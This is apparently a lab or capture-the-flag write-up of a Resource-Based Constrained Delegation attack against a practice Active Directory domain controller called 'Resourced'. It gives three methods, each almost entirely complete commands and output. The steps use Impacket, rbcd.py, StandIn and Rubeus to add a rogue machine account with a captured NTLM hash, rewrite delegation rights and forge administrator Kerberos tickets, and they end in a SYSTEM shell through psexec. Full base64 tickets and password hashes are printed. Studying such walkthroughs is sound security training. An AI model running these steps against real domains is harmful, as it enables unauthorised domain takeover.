# Resource-Based Constrained Delegation

## Method 1

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-addcomputer -computer-name adam -computer-pass P@ssw0rd123 -dc-ip 192.168.131.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account adam$ with password P@ssw0rd123.
```

We can verify our account was added

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer adam


DistinguishedName : CN=adam,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : adam
ObjectClass       : computer
ObjectGUID        : ace32c13-50e7-49fd-80f4-6f5559df7164
SamAccountName    : adam$
SID               : S-1-5-21-537427935-490066102-1511301751-4101
UserPrincipalName :
```

With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ python3 ~/Tools/rbcd.py -dc-ip 192.168.131.175 -t RESOURCEDC -f 'adam' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.131.175
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `adam` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] adam$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

We can confirm that this was successful by using our `evil-winrm` session.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\adam$ Allow
```

We now need to get the administrator service ticket. We can do this by using `impacket-getST` with our privileged machine account.

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-getST -spn cifs/resourcedc.resourced.local resourced/adam\$:'P@ssw0rd123' -impersonate Administrator -dc-ip 192.168.131.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ export KRB5CCNAME=./Administrator.ccache
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.131.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file hMldjWUN.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service ydjE on resourcedc.resourced.local.....
[*] Starting service ydjE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

## Method 2

{% embed url="https://youtu.be/xMTCZt5DRB0" %}

{% embed url="https://github.com/FuzzySecurity/StandIn" %}

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\StandIn.exe --computer adam --make

[?] Using DC    : ResourceDC.resourced.local
    |_ Domain   : resourced.local
    |_ DN       : CN=adam,CN=Computers,DC=resourced,DC=local
    |_ Password : CXmmf6iesgcIpwV

[+] Machine account added to AD..
```

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-ADComputer -Filter * | Select-Object Name, SID

Name       SID
----       ---
RESOURCEDC S-1-5-21-537427935-490066102-1511301751-1000
adam       S-1-5-21-537427935-490066102-1511301751-4101
```

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101

[?] Using DC : ResourceDC.resourced.local
[?] Object   : CN=RESOURCEDC
    Path     : LDAP://CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity
```

Get the hash of the password

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe hash /password:CXmmf6iesgcIpwV /user:adam$ /domain:resourced.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Calculate Password Hash(es)

[*] Input password             : CXmmf6iesgcIpwV
[*] Input username             : adam$
[*] Input domain               : resourced.local
[*] Salt                       : RESOURCED.LOCALhostadam.resourced.local
[*]       rc4_hmac             : E1A3DB48A04C4CC148FB5AA8643E7AF0
[*]       aes128_cts_hmac_sha1 : 50BB2D03A00C15B8AFCB402EFDBBEB24
[*]       aes256_cts_hmac_sha1 : 0F0542DF868703941A5C6FF678F0BD8C9BA031D5FCCADCFFA3A560BB2CE3122D
[*]       des_cbc_md5          : 019DB3A7346B15DF
```

Impersonate the Administrator

{% code fullWidth="false" %}
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe s4u /user:adam /rc4:E1A3DB48A04C4CC148FB5AA8643E7AF0 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: S4U

[*] Using rc4_hmac hash: E1A3DB48A04C4CC148FB5AA8643E7AF0
[*] Building AS-REQ (w/ preauth) for: 'resourced.local\adam'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFBDCCBQCgAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmx
vY2Fso4IDxjCCA8KgAwIBEqEDAgECooIDtASCA7CwkLlQfKVxjHS9bzsszOgFi2i435Az8EBEZEvijkp7R8DKqIkdqTEaVneIoa3DdsgHh05s1iVXGLgrp2OgEl5GMSh1
FJCr7gxVzvptJfyTI6ZyWOkG0mCRIUczD3s7iBdoL7oyrSA0kb+vW2OwyU1bx8qZ/2p7QGR9/37YiLayCRYZp/qq2p1+gWbPsZIz2G6X+Y0HKl3RuXXX4v8JicYXi3bcS
CHfYxoNQ7UBnsr1I0xWHEh6bI5g621RtpcELxt/mRA2Z5fAsMXx03wzTODUWRx5X0eLvtjRb1Dd4+QQ4KxZKWPzqpABmCrp9QS+1B6tafMuHQAqEHPHCRjMIm140jPm4O
Jt9Mrvg3R8RFn/JNHr+6fW3D1pTsZh1N0esb8xg7leXzxrXk1RAZ/aQZ4XkUGyaJn+uqsS1hdv4L4FYE6Pt45uMvwu/za7r8M+JZeQ24tf5QwDdb5U3aPx8k2SSQtUyXz
Eoo/iaFd9ngSgraxugpstbkYFGd90l1mNiPCWYgPFzknxs6XqGjJJrNgnPli3wyLnVkwKq/et2BkMn/yjoDBZlMZJBPpKgBR93HpMKeuZE2Inc65v3DOpRwHGweF9NeoN
CQGYdpm54VAr50Gqlf8LJoBIDQ35AaQwFg0trgvAFUu+qV1Enh32+We8L3tFQQfOVaLf3yUId/0gRbD3s4xAzXHRft74ajqSP/CO11sJUm9kLBUT+2E0WqaIMskZg/lM2
V3r5CMt8nSpWK8rnnVoDKYDsYXoskmekHOQ+qGWf/Gvp5C1tULVFCj7EsgWhi/oa7tgCT+xwYM1Qvzsmpwk3eGE02MN6LByLPVy8QRvJBtrW8EHVZrrFFrMmpWdImwG+z
9iYhnLLC6VThWJvKy4mOr1jMOit2ip9IW4CDwO0MvaMwPQyCyvR9t03CpPXY/ueksiPdXT+ICfOhLBEi85xcBr1+b9LM3D4Tn7KNiXdVp7LZ5zCO2EmeGifUeErpRgVfz
1l1/DI5op68KFGZhluRplfcpCTz5dsbMH5M/WcxIVc7AnsTvIVWkMedZ+BHZ2gHisLqKP4SaDqkS5JNtnmu8o73Wotx55x7IcuyaNKT+S/mE3TOA9+4nAHvIatPipPrGp
tbNcR9+8+FYdX6/QILLugy8s4b1GVqMiFcYGyW9dAGR7Nyp3X8B2Xdipa01PyHSPPKW+WAbhKDZghmetdT93Bc3YABuhyZooV4jxGuLJCx7DUBVc0nv1oV/Au+fQOCeTi
TgbG5AM56OB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oBswGaADAgEXoRIEEFA7BrEgsAXAUpLIfhc/PvyhERsPUkVTT1VSQ0VELkxPQ0FMohEwD6ADAgEBoQ
gwBhsEYWRhbaMHAwUAQOEAAKURGA8yMDIyMTIyOTIxMTQ0NVqmERgPMjAyMjEyMzAwNzE0NDVapxEYDzIwMjMwMTA1MjExNDQ1WqgRGw9SRVNPVVJDRUQuTE9DQUypJDA
ioAMCAQKhGzAZGwZrcmJ0Z3QbD3Jlc291cmNlZC5sb2NhbA==


[*] Action: S4U

[*] Building S4U2self request for: 'adam@RESOURCED.LOCAL'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'adam@RESOURCED.LOCAL'
[*] base64(ticket.kirbi):

      doIFjDCCBYigAwIBBaEDAgEWooIEpjCCBKJhggSeMIIEmqADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIRMA+gAwIBAaEIMAYbBGFkYW2jggRrMIIEZ6ADAgEXoQM
CAQGiggRZBIIEVct+yiLfnKzMJ4KHLtx1xgVBfMtlt9pyBAXOHKxO8Gs2GZUCwEZQavlF39ZWOPcT0HmYQQlBEwbgArv1dJuvdCBcY08j2Gt9vWHEc+tuYvC8xQwaEa5O
2VzkykJHqqyPWX7XWI0jHZapjLoeD3pdrBmSkT3/4Toba8mgTVJoB2WqshMlz7LEzBU1EJMrdtp1o2AfgFLlnAQUJdsBlHGaOBU6Hvr4wooYvivv/ArCuCm48DpAOu68b
LcCmI535pehCh/8rp9pGSQxjyAOpwFcP6MK8N9AOF1A3VPWMHXEf2Emuv96MZa3lBdgqEhUi1uejWJid1Un530MwJd/ShYZ9gdQKjo5x5zI5wdaO+loKJjeDvC+QFF6rK
vbmsrxZiMRnBjllycQDxS+bJRGsKZtgCv2T0OOGDnH/G5v/WNKK1HMm7eRenHVoB5NFKCAHIRk6ZQSbif4zY3SISrCBtOC+2jgsVEg6QWsmQUoZf2sc9kkzWt2rzBJtKx
gG+lM2hJYS4MMjc22RPKvJ/Rb6m9jIvmDieTqHWGuRMwmJVWlh7EI+IPTIl923sEj4nOaLSTp9Xlj9kb+rXDwDMV5YIj+YKqVdZ/T39yMuGzGZ98skVlo2Yi1FUFV/V0V
M0qqbZN9o/EVCYMAbHcXicjPGTxzjikeNAgHcd5nAoNmBvuBRJ20hohVp4c0ZNjQOGOjBwKVrlXp/kbFS6mv7ZalKwynRaIqEes4jaz30w3Lb0a8GgNVXsCMJYAdXg1qr
2u4/0LC8FjIPZQeKwFOHqIvRoN2BLjPzRa65z75dIi8ZizLSjN4xTeXPDrzMGJ/1UXpVWIz19zpwlMuBaOlzn+S0Y2Gdy79KIK9a4UT0c0FuA+YYPoYNZpa5uyIgOjnd+
oMN7Aj4S6mmp4r/4f4+f/EJ5ge629ybNAdD5ICGwMSo6pYtLFSxRZSO+yVAdEe9jNdk2sEPtZ++QA6lgRCsbzs9CwXabmFdFgS7Y2GfNbY57XtozHb/Xb4wqiro7hcMEs
qwYHacdti2MV/Mq62eBr+7fbHZxentqYoZqL9AqpRrZRKUCXJG++HbgiuLdgIEV6kiiPq613fsLb4M3FNJxmv22O7rj4jXgk5yOY7o8nFwstgrF00BRZJbgzkF2mO0u3x
jzmFG/X8CeQyERwvxpGLYgnoh46h0f05mMM7hBFrAwOfS52+3CFdmC3qdKsga9FyXVFoXo77YCkVvMqVhFarcEQRAxJQvoSjxNU6+2zIu191X9KwA7I7egv3lzM0/MoPU
It0Ebib2vZ5VtLnqb2jncO2E3Um+Ey6jk5TTGfoWYYFobWzWeo0MYOPCItB4xBMwTpp8GPaZqXjFkgJjZWHV4NtwRsccI9/JYjE2/BeF3NGRa1NV7gw+mpH02YhcHNxII
0bdlYzFx7rGWKAklf7eZYVn7nsrtyRRpqcA3xLbuxu0kswsCBfogmlC/udmr6wcUaVfTeKxmnqo4HRMIHOoAMCAQCigcYEgcN9gcAwgb2ggbowgbcwgbSgGzAZoAMCARe
hEgQQXtqLLPCjUDX/FR/H+xhtpaERGw9SRVNPVVJDRUQuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjIxMjI5MjExNDQ1WqYR
GA8yMDIyMTIzMDA3MTQ0NVqnERgPMjAyMzAxMDUyMTE0NDVaqBEbD1JFU09VUkNFRC5MT0NBTKkRMA+gAwIBAaEIMAYbBGFkYW0=

[*] Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local'
[*] Building S4U2proxy request for service: 'cifs/resourcedc.resourced.local'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/resourcedc.resourced.local':

      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
bGnJlc291cmNlZGMucmVzb3VyY2VkLmxvY2Fs
[+] Ticket successfully imported!
```
{% endcode %}

We see that we do have the ticket for the administrator

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> klist

Current LogonId is 0:0xa76b8

Cached Tickets: (1)

#0>     Client: administrator @ RESOURCED.LOCAL
        Server: cifs/resourcedc.resourced.local @ RESOURCED.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 12/29/2022 13:14:45 (local)
        End Time:   12/29/2022 23:14:45 (local)
        Renew Time: 1/5/2023 13:14:45 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

We have to now do is create the ticket locally and use it remotely

```
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
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ cat ticket.b64 | base64 -d > ticket.kirbi
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ export KRB5CCNAME=`pwd`/ticket.ccache
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.131.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file esSUYekm.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service ILjV on resourcedc.resourced.local.....
[*] Starting service ILjV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Method 3

Using this&#x20;

{% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg" %}

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-addcomputer -computer-name 'evilComputer' -computer-pass 'P@ssw0rd123!' -dc-host 192.168.131.175 resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account evilComputer$ with password P@ssw0rd123!
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-rbcd -delegate-from 'evilComputer$' -delegate-to 'RESOURCEDC$' -dc-ip 192.168.131.175 -action 'write' resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] evilComputer$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     evilComputer$   (S-1-5-21-537427935-490066102-1511301751-4101)
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-getST -spn host/resourcedc.resourced.local resourced.local/evilComputer:'P@ssw0rd123!' -impersonate Administrator -dc-ip 192.168.131.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ export KRB5CCNAME=./Administrator.ccach
```

```
╭─kali at kali in ~/Documents/pg/Resourced
╰─○ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.131.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file QPwBniYr.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service ndOg on resourcedc.resourced.local.....
[*] Starting service ndOg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```
